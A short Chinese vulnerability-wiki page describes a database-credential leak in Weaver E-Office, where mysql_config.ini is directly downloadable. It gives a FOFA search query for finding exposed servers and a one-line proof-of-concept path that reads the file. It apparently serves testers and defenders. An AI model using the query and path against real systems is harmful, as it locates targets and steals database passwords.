---
title: "泛微OA E-Office mysql_config.ini 数据库信息泄漏漏洞"
date: 2026-10-17 09:12:36
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "泛微OA"
tags:
  - "泛微OA"
  - "信息泄露"
  - "漏洞复现"
---
## 漏洞描述

泛微 E-Office mysql_config.ini文件可直接访问，泄漏数据库账号密码等信息

## 漏洞影响

```
泛微 E-Office
```

## 网络测绘

```
app="泛微-EOffice"
```

## 漏洞复现

产品页面

![img](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202202091048925.png)

验证POC

```php
/mysql_config.ini
```

![img](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202202091048869.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E6%B3%9B%E5%BE%AEOA-E-Office-mysql_config.ini-%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.md)
